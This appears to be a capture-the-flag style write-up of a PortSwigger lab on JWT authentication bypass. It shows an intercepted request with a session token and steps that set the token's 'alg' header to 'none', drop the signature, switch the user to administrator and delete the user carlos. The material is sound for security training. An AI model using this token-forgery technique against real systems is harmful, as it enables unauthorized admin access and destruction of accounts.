# JWT authentication bypass via flawed signature verification

Link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

### solution

- start by logging in using the creds wiener:peter as mentioned in the challange
- when you access /admin endpoint you will get this message `Admin interface only available if logged in as an administrator`
- go to burp suit and intercept this request
```
GET /admin HTTP/2
Host: 0af5008504014cf28363ec620058009f.web-security-academy.net
Cookie: session=eyJraWQiOiI5ZWE4ZWRiOS0xZTdlLTQ3NGItOGFkYS03NjM5MTljODU3YjMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwNzM4NDYyOX0.w0BatL3HjFnGRyAj130DBaow6cBnKdboqVfrUVrKYE_txHCEIHaRaU26yIp3QhluAOHziUKzjWv9tapqUrhetJqB5rMO6n-Id51uHt-r0f4ev9tZ97HDT8U-6rmglq3BgCJbZ9fjhRYZNg1fJLEgBQnL0nQivSm1Fx8JKbsTu2Asvdvk5xn_gFS1OuvYbFA7_GgCkb4WWEBL6YtNfV-vvLRW-0w15f9cP4WFIwYAGIGoXZYxUaxAlnhX_EhBBpV_B0DVD5clMhRMIg58LPZ-DKOGaxXwfPFppxvau_j06YIqLoEYIjQNWGUZqO13JvA35xR_EDCszU77bRdFZaxRYQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```

- We see that interesting cookie session which is JWT
- Decode the payload and it will be
`{"iss":"portswigger","sub":"wiener","exp":1707384629}`
- changing `wiener` to `administrator` then encode it again and send the request after the modification
- We are still unauthorized
- so let's Decode the Header, it will be
`{"kid":"9ea8edb9-1e7e-474b-8ada-763919c857b3","alg":"RS256"}`
- make `alg` to be `none` and remove the signature part from the token (don't remove the dot)
- We accessed `/admin` successfully
- now let's delete carlos by sending the request to `/admin/delete?username=carlos`
- congratzzzzzzzzzzzzzzzz